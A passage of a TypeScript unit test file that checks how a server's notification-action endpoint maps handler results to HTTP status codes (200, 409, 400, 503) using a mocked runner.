      return { code: 200 as const, ok: true, action: "approve" as const };
    });
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      runner,
    );
    const res = await internals.handleRequest(
      postBody({ sessionId: "s1", action: "approve", statusChangedAt: "t" }),
    );
    expect(res.status).toBe(200);
    expect(received).toEqual({
      sessionId: "s1",
      action: "approve",
      statusChangedAt: "t",
      userText: undefined,
    });
  });

  it("maps a rejection code (409) and error message through", async () => {
    const runner = mock(async () => ({
      code: 409 as const,
      ok: false,
      error: "stale",
    }));
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      runner,
    );
    const res = await internals.handleRequest(
      postBody({ sessionId: "s1", action: "approve" }),
    );
    expect(res.status).toBe(409);
    expect(await res.json()).toEqual({ ok: false, error: "stale" });
  });

  it("returns 400 for a body missing sessionId/action without calling the handler", async () => {
    const runner = mock(async () => ({ code: 200 as const, ok: true }));
    const { internals } = createServer(
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      runner,
    );
    const res = await internals.handleRequest(postBody({ action: "approve" }));
    expect(res.status).toBe(400);
    expect(runner).not.toHaveBeenCalled();
  });

  it("returns 503 when no notification-action handler is wired", async () => {
    const { internals } = createServer();
    const res = await internals.handleRequest(
      postBody({ sessionId: "s1", action: "approve" }),
    );
    expect(res.status).toBe(503);
  });
});
